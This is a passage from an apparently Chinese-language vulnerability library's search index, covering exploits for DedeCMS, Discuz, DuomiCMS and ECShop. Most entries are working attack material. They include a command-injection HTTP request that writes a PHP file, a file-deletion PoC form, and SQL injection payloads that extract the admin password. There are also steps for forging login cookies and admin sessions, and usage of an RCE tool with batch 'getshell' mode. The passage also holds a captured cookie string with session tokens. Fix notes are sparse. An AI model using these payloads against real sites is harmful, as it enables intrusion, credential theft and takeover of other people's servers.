SP2</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95SSV-97087/#_2","title":"\u6f0f\u6d1e\u6210\u56e0","text":"<p>dedecms \u7684\u4f1a\u5458\u6a21\u5757\u7684\u8eab\u4efd\u8ba4\u8bc1\u4f7f\u7528\u7684\u662f\u5ba2\u6237\u7aef session\uff0c\u5728 Cookie \u4e2d\u5199\u5165\u7528\u6237 ID \u5e76\u4e14\u9644\u4e0a ID__ckMd5\uff0c\u7528\u505a\u7b7e\u540d\u3002\u4e3b\u9875\u5b58\u5728\u903b\u8f91\u6f0f\u6d1e\uff0c\u5bfc\u81f4\u53ef\u4ee5\u8fd4\u56de\u6307\u5b9a uid \u7684 ID \u7684 Md5 \u6563\u5217\u503c\u3002\u539f\u7406\u4e0a\u53ef\u4ee5\u4f2a\u9020\u4efb\u610f\u7528\u6237\u767b\u5f55\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95SSV-97087/#_3","title":"\u590d\u73b0","text":"<p>\u73b0\u5728\u6211\u4eec\u7684\u601d\u8def\u5c31\u662f \u5148\u4ece <code>member/index.php</code> \u4e2d\u83b7\u53d6\u4f2a\u9020\u7684 DedeUserID \u548c\u5b83\u5bf9\u4e8e\u7684 md5 \u4f7f\u7528\u5b83\u767b\u5f55 \u8bbf\u95ee member/index.php?uid=0000001 \u5e76\u6293\u5305(\u6ce8\u610f cookie \u4e2d last_vid \u503c\u5e94\u8be5\u4e3a\u7a7a)\u3002  \u53ef\u4ee5\u770b\u5230\u5df2\u7ecf\u83b7\u53d6\u5230\u4e86\uff0c\u62ff\u53bb\u5f53\u505aDeDeUserID \u53ef\u4ee5\u770b\u5230\uff0c\u767b\u9646\u4e86 admin \u7528\u6237\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95SSV-97087/#_4","title":"\u4fee\u590d\u610f\u89c1","text":"<p>M_ID \u88ab intval \u540e\u8fd8\u8981\u5224\u65ad\u662f\u5426\u4e0e\u672a intval \u4e4b\u524d\u76f8\u540c\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9ECVE-2018-20129/","title":"Dedecms\u524d\u53f0\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1eCVE-2018-20129","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9ECVE-2018-20129/#_1","title":"\u5f71\u54cd\u7248\u672c","text":"<p>dedecmsV5.7 SP2</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9ECVE-2018-20129/#_2","title":"\u6f0f\u6d1e\u6210\u56e0","text":"<p>\u7ba1\u7406\u5458\u7528\u6237\u524d\u53f0\u53ef\u4ee5\u7ed5\u8fc7\u9650\u5236\u4e0a\u4f20shell</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9ECVE-2018-20129/#_3","title":"\u590d\u73b0","text":"<p>\u767b\u5f55\u5e76\u8fdb\u5165 <code>member/article\\_add.php</code> \u53d1\u5e03\u6587\u7ae0\uff0c\u9009\u62e9\u4e0b\u9762\u7684\u5bcc\u6587\u672c\u7f16\u8f91\u5668\u63d2\u5165\u56fe\u7247  \u9009</p> <p>\u62e9\u597d shell \u5e76\u4e0a\u4f20\u6293\u5305</p> <p> </p> <p> </p> <p>\u5411\u5982\u4e0a\u5206\u6790\u4fee\u6539\u6587\u4ef6\u540d\u4e0econtent-type\uff0c\u5373\u53ef\u8fd4\u56de shell \u5730\u5740 </p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DedeCMS/Dedecms%E5%89%8D%E5%8F%B0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9ECVE-2018-20129/#_4","title":"\u4fee\u590d\u610f\u89c1","text":"<p>\u5728\u6700\u540e\u62fc\u63a5\u6587\u4ef6\u540d\u65f6\u518d\u5224\u65ad\u4e00\u6b21\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Discuz/Discuz%21%201.5-2.5%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","title":"Discuz! 1.5-2.5 \u547d\u4ee4\u6267\u884c\u6f0f\u6d1e","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Discuz/Discuz%21%201.5-2.5%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#_1","title":"\u5f71\u54cd\u7248\u672c","text":"<p>Discuz! 1.5-2.5</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Discuz/Discuz%21%201.5-2.5%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#poc","title":"POC","text":"<p>\u9700\u8981\u767b\u5165\u540e\u53f0\u3002</p> <p> </p> <p>\u4fee\u6539\u7684\u53c2\u6570</p> <p>\u53c2\u6570<code>customtables[]</code></p> <pre><code>customtables%5B%5D=pre_common_admincp_cmenu\"&gt;aaa; echo '&lt;?php phpinfo(); ?&gt;' &gt; phpinfo.php #\n</code></pre> <p>\u6570\u636e\u5305</p> <pre><code>POST /discuz25/admin.php?action=db&amp;operation=export&amp;setup=1 HTTP/1.1\nHost: localhost\nContent-Length: 252\nCache-Control: max-age=0\nOrigin: http://localhost\nUpgrade-Insecure-Requests: 1\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\nReferer: http://localhost/discuz25/admin.php?action=db&amp;operation=export\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: _ga=GA1.1.994534325.1530166127; PHPSESSID=ffe1069f199ac7656303b61e42db4f5d; ECSCP_ID=e685eee56d5dc4a732b0b1ecb8cbac6becac2355; ECS_ID=b9e7920dfb02c84b5298d0022c64a8fc393376d7; Phpstorm-326452dc=558db1bc-7f7b-4670-8d36-9cef7d8c1b9d; ECS[visit_times]=8; 3Od_visitedfid=2; 3Od_auth=03d3WSoYgxBuC4Yg3mqq4yEVgLBDsrbNx%2F8rIcURpRI5sDFtpC1S9F%2BYa6BViyFggZYM7bac7evIAZJdgLOJ7Q; 3Od_sid=mm4AMQ; QoOR_2132_saltkey=V6AnRzmw; QoOR_2132_lastvisit=1545183584; QoOR_2132_widthauto=-1; R94S_2132_saltkey=1hs56u42; R94S_2132_lastvisit=1545220172; R94S_2132_promotion=1; R94S_2132_auth=75696lGYV1FEogy00DO%2FmyhWbxk8OljAPZAeSvxfgwvvLbMruyS2sfVSYZUG4wr3GYw5L66%2FfppgB9gzioss; R94S_2132_creditnotice=0D0D2D0D0D0D0D0D0D1; R94S_2132_creditbase=0D0D1D0D0D0D0D0D0; R94S_2132_creditrule=%E6%AF%8F%E5%A4%A9%E7%99%BB%E5%BD%95; R94S_2132_ulastactivity=e0adnKO8pY2qUt5XPBdVc3jbgQxCrCiAkAFzNuN%2Fu9wTbgHc7XLK; R94S_2132_sid=9H4E8j; R94S_2132_lastact=1545224711%09admin.php%09; QoOR_2132_sid=BdGwL9; QoOR_2132_sendmail=1; QoOR_2132_ulastactivity=9cf4%2B3XCcfF1uHee0LOFG0wa6FFvCc1Rp96Kg%2BkgOi%2FL7ovDRKru; QoOR_2132_auth=32d7SwpKowF2VAeqfqe0dWo1FjINHjZA9zt%2ByF8A7LOif0pFSaHnEznijiCaqgsQD8NSBtEiwEDL4Wrnx1gz; QoOR_2132_checkpatch=1; QoOR_2132_checkupgrade=1; QoOR_2132_lastact=1545224853%09admin.php%09\nConnection: close\n\nformhash=0d2eaac0&amp;scrolltop=&amp;anchor=&amp;type=custom&amp;customtables%5B%5D=pre_common_admincp_cmenu\"&gt;aaa; echo '&lt;?php phpinfo(); ?&gt;' &gt; phpinfo.php #&amp;method=shell&amp;extendins=0&amp;sqlcompat=&amp;usehex=1&amp;usezip=0&amp;filename=181219_u0CC19kJ&amp;exportsubmit=%E6%8F%90%E4%BA%A4\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Discuz/Discuz%21%201.5-2.5%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#references","title":"References","text":"<p>https://paper.seebug.org/763/</p> <p>https://github.com/FoolMitAh/CVE-2018-14729</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Discuz/Discuz3.4%E8%B6%8A%E6%9D%83%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E/","title":"Discuz3.4\u8d8a\u6743\u767b\u5f55\u6f0f\u6d1e","text":"<p>\u7531\u4e8eDZ 3.4\u9ed8\u8ba4\u5b89\u88c5\u4e86\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8be5\u6f0f\u6d1e\u8d8a\u6743\u767b\u9646\u3002</p> <p>\u901a\u8fc7/plugin.php?id=wechat:wechat&amp;ac=wxregister&amp;username={name}\u8fd9\u79cd\u65b9\u5f0f\u53ef\u4ee5\u4f7fopenid\u4e3a\u7a7a\uff0c \u4f46\u6ce8\u518c\u7684\u662f\u4e00\u4e2a\u65b0\u7684\u8d26\u53f7\u3002</p> <p>\u89e3\u9664\u6307\u5b9auid\u7ed1\u5b9a\u7684\u5fae\u4fe1\uff1a</p> <p>/plugin.php?id=wechat:wechat&amp;ac=unbindmp&amp;uid={uid}&amp;hash={formhash}</p> <p>\u767b\u9646\u7b2c\u4e00\u4e2aopenid\u4e3a\u7a7a\u7684\u8d26\u53f7\uff1a/plugin.php?id=wechat:wechat&amp;ac=wxregister</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Discuz/Discuz_%EF%BC%9C3.4_birthprovince_%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/","title":"Discuz_\uff1c3.4_birthprovince_\u524d\u53f0\u4efb\u610f\u6587\u4ef6\u5220\u9664","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Discuz/Discuz_%EF%BC%9C3.4_birthprovince_%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#affected-version","title":"Affected Version","text":"<p>Discuz &lt; 3.4 \u7248\u672c</p> <p>\u9700\u8981\u4f1a\u5458\u8eab\u4efd\u767b\u9646\u7ad9\u70b9\u3002</p> <p>\u4e0b\u8f7d\u5730\u5740\uff1a \u94fe\u63a5: https://pan.baidu.com/s/1hsOoSte \u5bc6\u7801: nvjj</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Discuz/Discuz_%EF%BC%9C3.4_birthprovince_%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#poc","title":"PoC","text":"<p>\u6d4b\u8bd5\uff1a</p> <ol> <li>\u4e3a\u4e86\u4e0d\u7834\u574f\u539f\u6709\u7a0b\u5e8f\uff0c\u5728\u6839\u76ee\u5f55\u4e0b\u65b0\u5efa 1.txt \u4f5c\u4e3a\u6f14\u793a\u3002</li> </ol> <p></p> <ol> <li>\u767b\u9646\u524d\u53f0\uff0c\u8bbf\u95ee http://localhost/Discuz/Discuz_X3.2_TC_BIG5/home.php?mod=spacecp&amp;ac=profile&amp;op=base</li> </ol> <p>\u5148\u53d1\u8d77\u4e00\u4e2aPOST\u8bf7\u6c42 </p> <pre><code>birthprovince=../../../1.txt&amp;profilesubmit=1&amp;formhash=18a19dce\n// formhash \u9700\u8981\u53f3\u952e\u67e5\u770b\u6e90\u4ee3\u7801\u5f97\u5230\n</code></pre> <p>\u6210\u529f\u540e\uff0c\u4e2a\u4eba\u4fe1\u606f\u5df2\u7ecf\u88ab\u4fee\u6539\u6210\u5982\u4e0b:</p> <p></p> <ol> <li>\u6700\u540e\uff0c\u672c\u5730\u63d0\u4ea4POST\u8868\u5355\u5220\u9664\u6587\u4ef6 1.txt</li> </ol> <p>\u8868\u5355\u5185\u5bb9\uff1a</p> <pre><code>&lt;form action=\"http://localhost/Discuz/Discuz_X3.2_TC_BIG5/home.php?mod=spacecp&amp;ac=profile&amp;op=base\" method=\"POST\" enctype=\"multipart/form-data\"&gt;\n&lt;input type=\"file\" name=\"birthprovince\" id=\"file\" /&gt;\n&lt;input type=\"text\" name=\"formhash\" value=\"18a19dce\"/&gt;&lt;/p&gt;\n&lt;input type=\"text\" name=\"profilesubmit\" value=\"1\"/&gt;&lt;/p&gt;\n&lt;input type=\"submit\" value=\"Submit\" /&gt;\n&lt;/from&gt;\n</code></pre> <p>\u968f\u4fbf\u4e0a\u4f20\u4e00\u4e2a\u56fe\u7247\u63d0\u4ea4\u4f1a\u5bfc\u81f4\u5220\u9664 birthprovince \u8bbe\u7f6e\u7684\u6587\u4ef6\u540d\u79f0\uff0c\u5728\u8fd9\u91cc\u662f 1.txt\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Discuz/Discuz_%EF%BC%9C3.4_birthprovince_%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/#references","title":"References","text":"<ol> <li>http://www.freebuf.com/vuls/149904.html</li> <li>http://www.freebuf.com/articles/system/149810.html</li> </ol>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Discuz/discuz-ml-rce/","title":"dz-ml-rce.py \uff1adiscuz ml RCE \u6f0f\u6d1e\u68c0\u6d4b\u5de5\u5177","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Discuz/discuz-ml-rce/#_1","title":"\u6982\u8ff0","text":"<p> \u6f0f\u6d1e\u5728\u4e8ecookie\u7684language\u53ef\u63a7\u5e76\u4e14\u6ca1\u6709\u4e25\u683c\u8fc7\u6ee4\uff0c\u5bfc\u81f4\u53ef\u4ee5\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\uff0c\u8be6\u60c5\u53c2\u8003</p> <p>discuz ml RCE\u6f0f\u6d1e\u91cd\u73b0\u53ca\u5206\u6790</p> <p> \u672c\u5de5\u5177\u652f\u6301\u5355url\u548c\u6279\u91cf\u68c0\u6d4b\uff0c\u6709\u5224\u65ad\u6a21\u5f0f\uff08\u53ea\u5224\u65ad\u6709\u65e0\u8be5\u6f0f\u6d1e\uff09\u3001cmdshell\u6a21\u5f0f\uff08\u8fd4\u56de\u7b80\u5355\u7684cmd shell\uff09\u548cgetshell\u6a21\u5f0f\uff08\u5199\u5165\u4e00\u53e5\u8bdd\u6728\u9a6c\uff09\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Discuz/discuz-ml-rce/#_2","title":"\u9700\u6c42","text":"<p> python2.7 pip -r requirements.txt </p> <p>\u4f7f\u7528\u65f6\u52a0\u4e0a\u6f0f\u6d1ePHP\u9875\u9762\uff08\u5982forum.php,portal.php\uff09\uff0c\u76f4\u63a5\u5199\u57df\u540d\u53ef\u80fd\u4f1a\u91cd\u5b9a\u5411\u5bfc\u81f4\u8bef\u62a5!</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Discuz/discuz-ml-rce/#_3","title":"\u5feb\u901f\u5f00\u59cb","text":"<p> \u4f7f\u7528\u5e2e\u52a9 python dz-ml-rce.py -h</p> <p></p> <p> \u5224\u65ad\u6a21\u5f0f python dz-ml-rce.py -u \"http://www.xxx.cn/forum.php\" </p> <p></p> <p> cmdshell\u6a21\u5f0f python dz-ml-rce.py -u \"http://www.xxx.cn/forum.php\" --cmdshell</p> <p></p> <p> getshell\u6a21\u5f0f python dz-ml-rce.py -u \"http://www.xxx.cn/forum.php\" --getshell</p> <p></p> <p> \u6279\u91cf\u68c0\u6d4b python dz-ml-rce.py -f urls.txt</p> <p></p> <p> \u6279\u91cfgetshell python dz-ml-rce.py -f urls.txt --getshell</p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Discuz/discuz-ml-rce/#_4","title":"dz-ml-rce.py \uff1adiscuz ml RCE \u6f0f\u6d1e\u68c0\u6d4b\u5de5\u5177","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DuomiCMS/DuomiCMS3.0SQL%E6%B3%A8%E5%85%A5/","title":"DuomiCMS3.0SQL\u6ce8\u5165","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DuomiCMS/DuomiCMS3.0SQL%E6%B3%A8%E5%85%A5/#_1","title":"\u6f0f\u6d1e\u8be6\u60c5\uff1a","text":"<p>payload \uff1a</p> <pre><code>ajax.php?action=addfav&amp;id=1&amp;uid=1 and extractvalue(1,concat_ws(0x3A,0x3A,version()))\n</code></pre> <p></p> <p>\u4f46\u662f\u8981\u60f3\u7206\u51fa\u6709\u7528\u7684\u6570\u636e\uff0c\u8fd9\u91cc\u8fd8\u8981\u7ed5\u8fc7 duomiphp/sql.class.php \u6587\u4ef6\u7684SQL\u68c0\u6d4b\u89c4\u5219\u4ee5\u53ca\u5168\u5c40\u53d8\u91cf\u7684 _RunMagicQuotes \u51fd\u6570\u7684\u8f6c\u4e49\u3002\u8fd9\u91cc\u76f4\u63a5\u7ed9\u51fa\u6211\u6d4b\u8bd5\u6210\u529f\u7684 payload \uff1a</p> <pre><code>http://localhost//duomiphp/ajax.php?action=addfav&amp;id=1&amp;uid=10101 and `'`.``.vid and extractvalue(1,concat_ws(0x3A,0x3A,(select`password` from`duomi_admin` limit 1))) and `'`.``.vid\n</code></pre> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DuomiCMS/DuomiCMS3.0SQL%E6%B3%A8%E5%85%A5/#_2","title":"\u53c2\u8003\u94fe\u63a5","text":"<p>https://xz.aliyun.com/t/2828#toc-2</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DuomiCMS/DuomiCMS3.0%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/","title":"DuomiCMS3.0\u524d\u53f0\u4ee3\u7801\u6267\u884c","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DuomiCMS/DuomiCMS3.0%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#_1","title":"\u6f0f\u6d1e\u8be6\u60c5\uff1a","text":"<p>payload \u5982\u4e0b\uff1a</p> <pre><code>http://localhost/search.php?searchword={if:phpinfo()}phpinfo(){end\n</code></pre> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/DuomiCMS/DuomiCMS3.0%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/#_2","title":"\u53c2\u8003\u94fe\u63a5","text":"<p>https://xz.aliyun.com/t/2828#toc-2</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Ecshop/ECShop4.1.0%E5%89%8D%E5%8F%B0%E5%85%8D%E7%99%BB%E5%BD%95SQL%E6%B3%A8%E5%85%A5/","title":"ECShop4.1.0\u524d\u53f0\u514d\u767b\u5f55SQL\u6ce8\u5165","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Ecshop/ECShop4.1.0%E5%89%8D%E5%8F%B0%E5%85%8D%E7%99%BB%E5%BD%95SQL%E6%B3%A8%E5%85%A5/#0x00","title":"0x00 \u6f0f\u6d1e\u6982\u8ff0","text":"<p>\u5f71\u54cd\u7248\u672c\uff1aecshop4.1.0\u53ca\u4ee5\u4e0b \u662f\u5426\u9700\u8981\u8eab\u4efd\u8ba4\u8bc1\uff1a\u5426\uff0c\u524d\u53f0\u6f0f\u6d1e \u6f0f\u6d1e\u7c7b\u578b\uff1aSQL\u6ce8\u5165 CNVD\u7f16\u53f7\uff1aCNVD-2020-58823\uff0c*https://www.cnvd.org.cn/flaw/show/2454613* \u6e90\u7801\u83b7\u53d6\uff1ahttps://www.ecshop.com/\uff0c\u767b\u5f55\u6ce8\u518c\u4e0b\u8f7d\uff0c\u6700\u65b0\u7248\u672c\u4e3a4.1.1(\u5df2\u4fee\u590d)\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Ecshop/ECShop4.1.0%E5%89%8D%E5%8F%B0%E5%85%8D%E7%99%BB%E5%BD%95SQL%E6%B3%A8%E5%85%A5/#0x01","title":"0x01 \u6f0f\u6d1e\u8be6\u60c5","text":"<p>\u6f0f\u6d1e\u4ee3\u7801\uff1a/source/ecshop/delete_cart_goods.php,16\u884c</p> <p>\u6f0f\u6d1e\u4ee3\u7801</p> <p>$_POST\u53d8\u91cf\u76f4\u63a5\u4f20\u5165sql\u8bed\u53e5\u8fdb\u884c\u62fc\u63a5\uff0c\u518d\u8fdb\u5165\u6570\u636e\u5e93\u67e5\u8be2\uff0c\u89e6\u53d1\u6f0f\u6d1e\u3002</p> <p>\u5982\u679c\u6709\u5bf9ecshop\u8fdb\u884c\u8fc7\u4ee3\u7801\u5ba1\u8ba1\u7684\u8bdd\uff0c\u5e94\u8be5\u4f1a\u77e5\u9053\u5728includes/safety.php\u5b58\u5728\u4e2awaf\uff0c\u4f46\u662f\u5728\u8fd9\u4e2a\u7248\u672c\u5e76\u6ca1\u6709\u751f\u6548\uff0c\u8fd9\u91cc\u6f0f\u6d1e\u89e6\u53d1\u53ef\u4ee5\u4e0d\u8fdb\u5165\u8fd9\u91cc\u7684\u8fc7\u6ee4\u9632\u62a4\u903b\u8f91\u3002</p> <p>includes/safety.php</p> <p>\u672c\u5730\u642d\u5efa\u9a8c\u8bc1\u5982\u4e0b\uff0c\u914d\u7f6e\u9ed8\u8ba4\u662f\u5f00\u4e86\u62a5\u9519\uff0c\u7ebf\u4e0a\u7684\u6d4b\u8bd5\u73af\u5883\u4e5f\u662f\uff0c\u4e0d\u5b58\u5728\u62a5\u9519\u7684\u8bdd\u53ef\u4ee5\u901a\u8fc7\u76f2\u6ce8\u9a8c\u8bc1\u3002\u62a5\u9519\u6ce8\u5165\u7684\u622a\u56fe\u8bc1\u660e\u5982\u4e0b\u3002</p> <p>\u672c\u5730\u6f0f\u6d1e\u9a8c\u8bc1</p> <p>\u6f0f\u6d1e\u4fee\u590d\uff1a\u5bf9\u8bf7\u6c42\u53c2\u6570\u8fdb\u884c\u8fc7\u6ee4\u3002</p> <p>\u6f0f\u6d1e\u4fee\u590d</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Ecshop/ECShop4.1.0%E5%89%8D%E5%8F%B0%E5%85%8D%E7%99%BB%E5%BD%95SQL%E6%B3%A8%E5%85%A5/#0x02","title":"0x02 \u6ce8\u5165\u6f0f\u6d1e\u5229\u7528\u5206\u6790","text":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Ecshop/ECShop4.1.0%E5%89%8D%E5%8F%B0%E5%85%8D%E7%99%BB%E5%BD%95SQL%E6%B3%A8%E5%85%A5/#md5","title":"\u601d\u8def\u4e00\uff1a\u83b7\u53d6\u6ce8\u5165\u83b7\u53d6\u7ba1\u7406\u5458\u5bc6\u7801md5","text":"<p>ecshop\u9ed8\u8ba4\u5bc6\u7801\u4e0d\u52a0\u76d0\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u6ce8\u5165\u627e\u5230ecs_admin_user\u8868\u83b7\u53d6\u7ba1\u7406\u5458\u5bc6\u7801\u7684md5.</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Ecshop/ECShop4.1.0%E5%89%8D%E5%8F%B0%E5%85%8D%E7%99%BB%E5%BD%95SQL%E6%B3%A8%E5%85%A5/#session","title":"\u601d\u8def\u4e8c\uff1a\u83b7\u53d6\u7ba1\u7406\u5458session","text":"<p>\u5982\u679c\u7ba1\u7406\u5458\u4f7f\u7528\u4e86\u8f83\u4e3a\u590d\u6742\u7684\u5bc6\u7801\uff0cmd5\u89e3\u4e0d\u51fa\u6765\u65f6\uff0c\u53ef\u4ee5\u8003\u8651\u83b7\u53d6session\u3002\u5373cookie\u4e2dECSCP_ID\u7684\u503c\u3002 \u767b\u5f55\u7528\u6237\u7684session\u5b58\u5728ecs_sessions\u8868\uff0c\u4f46\u662f\u53ea\u6709sesskey\u3002</p> <p>ecs_sessions\u8868</p> <p>\u4ee3\u7801\u4e2d\u767b\u5f55\u6210\u529f\u540ecookie\u8bbe\u7f6e\uff1a<code>setcookie($this-&gt;session_name, $this-&gt;session_id . $this-&gt;gen_session_key($this-&gt;session_id), 0, $this-&gt;session_cookie_path, $this-&gt;session_cookie_domain,  $this-&gt;session_cookie_secure, TRUE);</code>.</p> <p>\u5176\u4e2d<code>$this-&gt;session_name</code> \u5c31\u662fECSCP_ID\uff0c <code>$this-&gt;session_id . $this-&gt;gen_session_key($this\u2192session_id)</code>\u5c31\u662f\u6700\u7ec8cookie\u7684\u503c\uff0c\u6570\u636e\u5e93\u4e2dsesskey\u5bf9\u5e94\u7684\u662f<code>$this-&gt;session_id</code>\uff0c\u81f3\u4e8e\u540e\u534a\u90e8\u5206\u662f\u901a\u8fc7gen_session_key\u8fd9\u4e2a\u51fd\u6570\u751f\u6210\u3002</p> <pre><code>function gen_session_key($session_id)\n    {\n        static $ip = '';\n        if ($ip == '')\n        {\n            $ip = substr($this-&gt;_ip, 0, strrpos($this-&gt;_ip, '.'));\n        } \n        return sprintf('%08x', crc32(ROOT_PATH . $ip . $session_id));\n    }\n</code></pre> <p>\u540e\u534a\u90e8\u5206gen_session_key\u901a\u8fc7ip\u548cROOT_PATH\u6765\u786e\u8ba4\uff0cip\u4e5f\u5728session\u8868\u4e2d\u53ef\u4ee5\u627e\u5230\uff0c\u81f3\u4e8eROOT_PATH\uff0c\u53ef\u4ee5\u901a\u8fc7\u731c\u6d4b\u6216\u8005\u90e8\u5206\u8def\u5f84\u7684\u62a5\u9519\u62ff\u5230\u3002\u6700\u540e\u62fc\u51d1\u5230\u7684\uff0c\u5c31\u662f\u6700\u7ec8\u7684cookie\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Ecshop/ECShop4.1.0%E5%89%8D%E5%8F%B0%E5%85%8D%E7%99%BB%E5%BD%95SQL%E6%B3%A8%E5%85%A5/#ecshopapiclientincludeslib_apiphp-shell","title":"\u601d\u8def\u4e09: ecshop/api/client/includes/lib_api.php \u5199\u5165shell","text":"<p>api/client 